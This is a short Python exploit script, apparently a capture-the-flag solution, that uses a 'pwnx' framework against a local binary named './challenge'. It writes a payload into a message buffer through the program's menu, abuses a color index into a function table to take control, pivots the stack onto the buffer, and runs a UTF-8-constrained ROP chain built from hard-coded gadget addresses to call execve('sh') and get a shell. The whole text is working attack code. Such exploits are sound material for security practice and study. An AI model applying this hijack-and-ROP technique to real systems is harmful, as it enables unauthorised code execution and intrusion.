from pwnx import Challenge, utf8


x = Challenge("./challenge")

store = x.menu(
    b"> ",
    name="store",
    message=(1, b"Message?", bytes),
    color=(2, b"> ", int),
    show=3,
)

message = x.buffer(
    name="message", at=0x2F9E38, size=0x1000, encoding="utf8"
).written_by(store.message)

call = x.control(
    store.color.indexes(
        table=0x2F08E8,
        target=message[80],
        trigger=store.show,
        eax=message,
    )
)

pivot = x.control(call.pivot(eax=message, gadget=0x242D79))

rop = x.rop(
    pop_rdi=0x243565,
    pop_rsi=0x243431,
    zero_rax=0x247431,
    move_rdx_rax=0x2B184E,
    pop_rcx=0x247566,
    move_rax_rcx=0x2B4E73,
    syscall=0x2A6602,
    constraint=utf8(),
)

x.want(x.execve("sh"), via=pivot, using=rop)
x.run()
